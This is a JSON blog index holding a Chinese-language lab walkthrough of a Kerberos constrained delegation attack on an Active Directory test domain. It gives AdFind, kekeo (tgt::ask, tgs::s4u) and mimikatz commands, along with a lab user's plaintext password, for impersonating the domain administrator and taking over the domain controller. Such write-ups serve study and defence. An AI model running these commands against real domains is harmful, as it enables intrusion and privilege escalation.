{"posts":[{"title":"2","content":"1 ","link":"https://cherry-cheeks.github.io/post/2/"},{"title":"约束委派攻击-基于服务用户复现","content":"准备环境： 1、windows server 2012 r2 ip：192.168.179.213 域管：administrator 机器名：dc（域控） 2、windows 7专业版 ip：192.168.179.130 用户名：win7 机器名：win7(域成员机) 3、域用户weipai 密码：2000816Liu! 4、域：zhou.com 准备工作： 1、因为委派对象只能是机器账户和服务账户，所以我们要将域用户weipai，通过spn注册成服务账户 2、将服务账户weipai设置成约束委派 工具： kekeo、mimikatz、AdFind 复现过程： 一、我们得先用AdFind找到设置了约束委派的用户： AdFind.exe -b &quot;DC=zhou,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto 得到信息： 1、设置约束委派的服务账户有weipai这一个 2、只能访问指定模拟域用户访问dc（域控）机器上面的cifs服务 正好我们有weipai这个服务账户的密码，我们可以通过约束委派攻击拿下域控 二、通过keKeo这个工具向KDC发起请求，得道weipai这个服务账户的TGT tgt::ask /user:weipai /password:2000816Liu! /domain:zhou.com /ticket:weipai.kirbi 三、利用weipai这个服务账户的TGT申请域控cifs服务的TGS票据 tgs::s4u /tgt:TGT_weipai@ZHOU.COM_krbtgt~zhou.com@ZHOU.COM.kirbi /user:administrator@zhou.com /service:cifs/dc.zhou.com 四、用mimikatz导入TGS票据 总结： 1、找到域内存在约束委派的用户，并查看是否可以访问域控的服务 2、拿下存在非约束委派的用户，并用kekeo来制作TGT 3、用kekeo配合上一步制作的TGT来制作访问域控的TGS 4、mimikatz导入上一步制作的TGS，拿下域控 参考：https://www.freebuf.com/articles/system/198381.html https://xz.aliyun.com/t/10061#toc-6 ","link":"https://cherry-cheeks.github.io/post/1/"}]}